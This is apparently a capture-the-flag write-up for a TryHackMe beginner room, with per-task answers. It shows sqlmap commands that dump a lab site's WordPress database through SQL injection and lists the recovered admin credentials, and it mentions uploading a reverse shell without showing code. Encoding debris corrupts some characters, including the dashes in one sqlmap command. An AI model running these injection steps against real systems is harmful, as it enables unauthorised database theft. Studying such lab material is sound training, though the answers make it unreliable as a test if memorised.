[TryHackMe | uopeasy](https://tryhackme.com/room/uopeasy)

University of Portsmouth's beginner room.

In this set of tasks you will learn the following:

- Basic SQL injection
- Use of reconnaissance tool
- nmap
- WordPress RCE and reverse shells
- Cracking the hash (John the ripper / hashcat)
- Possibly Nikto
- Burp Suite or dirbuster

The main goal here is to learn as much as possible. Make sure you are connected to our network using your [OpenVPN configuration file](https://tryhackme.com/access).

### #1 Deploy the machine and connect to **our network.**

```
No awnser needed
```

### #2 Do some basic reconnaissance on the website. What pages can you view? What ports are open? What can you access?

```
No awnser needed
```

### #3 You should have found some additional pages on different ports. What service does the site most likely use for this page?

```
mysql
```

### #4 Using the fact that this site has this service running, how can you exploit it? Do not use SQLMap yet..

```
Since this is some php room let's say that is SQLi (SQL Injection)
```

```
SQLi
```

### #5 Try and return 1 on the page by entering certain characters into the form.

```
No awnser needed
```

### #6 Using SQL injection, can you extract the username and password for this form? You may need the help of Burp's intruder function OR SQLMap.

```
No awnser needed
```

### #7 What was the username?

Dump the database using sqlmap

```
âžœ  ~ sqlmap -u http://10.10.180.236/login.php --forms -dbs
```

Let's see the content of the wordpress8080 table

```
âžœ  ~ sqlmap -u http://10.10.180.236/login.php â€“forms â€“dbs â€“dump-all -D wordpress8080
```

Credentials retrieved

```
Username : admin
Password : SuperSecretPassword
```

### #8 What was the password?

```
SuperSecretPassword
```

### #9 Now you have these credentials, where else on the site can you go? Using the credentials you have and another part of the site, login and try to execute remote commands on the server.

```
No awnser needed
```

### #10 Can you get a reverse shell back to your local machine?

```
No awnser needed
```

### #11 Can you crack anyones password? Using the very popular rockyou.txt

```
No awnser needed
```

### #12 What is the final cracked hash password for the user "user"?

Let's upload the reverse shell on the wordpress blog
